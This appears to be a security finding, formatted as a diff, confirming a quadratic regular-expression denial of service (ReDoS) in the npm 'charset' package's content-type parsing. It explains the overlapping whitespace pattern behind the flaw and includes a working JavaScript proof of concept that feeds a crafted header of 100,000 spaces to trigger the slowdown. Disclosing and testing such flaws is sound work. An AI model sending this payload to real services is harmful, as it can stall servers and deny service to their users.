@@ -1,0 +1,24 @@
+Confirmed: quadratic blowup in `charset`'s internal `headers`/content-type regex scan (`CHARTSET_RE.exec`) — doubling input length roughly quadruples runtime (100k chars ≈ 4.8s). This is a classic ReDoS from `\s*=\s*['"]? *` where the two space-matching stretches overlap.
+
+```javascript
+const charset = require("./node_modules/charset");
+
+// Simulate an HTTP response's `headers` object with an attacker-controlled
+// Content-Type value (e.g. reflected from an upstream request).
+// The `charset()` sink pulls `headers['content-type']` and runs it through
+// CHARTSET_RE, which suffers catastrophic (quadratic) backtracking on
+// crafted whitespace runs that never satisfy the trailing word-char group.
+const n = 100000; // increase further to make the hang more dramatic
+const evilContentType = "charset=" + " ".repeat(n) + "!";
+
+const headers = {
+  "content-type": evilContentType
+};
+
+console.log("Starting ReDoS trigger via charset(headers)...");
+const start = Date.now();
+
+charset(headers); // <-- vulnerable sink (reads headers['content-type'])
+
+console.log("Finished in", Date.now() - start, "ms");
+```
